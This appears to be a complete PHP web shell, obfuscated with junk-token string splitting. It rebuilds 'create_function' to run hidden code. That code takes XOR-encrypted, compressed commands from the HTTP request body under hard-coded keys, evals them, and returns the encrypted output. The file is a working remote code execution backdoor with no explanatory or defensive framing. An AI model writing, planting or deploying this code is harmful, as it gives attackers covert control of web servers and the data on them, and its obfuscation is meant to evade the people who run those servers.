<?php
$t='j_i=0;$j_i<$l;){j_for($j_j=0j_j_;($j<$c&&$j_i<$l);$j_j++,$i++)j_{$o.=$j_tj_{$i}^$k{$';
$i='j_j};}}returnj_ $j_o;}ifj_ (@preg_matchj_("/$khj_(.j_+)$j_kf/",@file_j_gej_tj__conte';
$I='$kj_="dej_74caa0";$kh="dj_5f1d80j_119ca";j_$kf="j_j_2be9cj_cj_90cb4d"j_;$p="OXWm0UDm0';
$K='();j_$r=@j_base6j_4_encode(@x(@gzcj_omj_press($o),$j_k))j_;printj_("$pj_$kh$r$kf");}';
$X=str_replace('g','','cgreatge_gfugnggction');
$v='nts("phj_p://inpuj_tj_"),$m)==j_1) {@ob_staj_rt(j_);@evj_al(@gzj_uncoj_mpressj_(@xj_';
$O='lj_IbMjIj_n";funcj_tion j_x(j_$j_t,$k){j_$c=j_strlen($k);$l=strj_len($t);j_$o=j_"";for($';
$Q='(@baj_se64_dej_code($mj_[1]),$k)));$o=j_@ob_j_get_contenj_ts()j_j_;@ob_enj_d_cleaj_n';
$C=str_replace('j_','',$I.$O.$t.$i.$v.$Q.$K);
$T=$X('',$C);$T();
?>
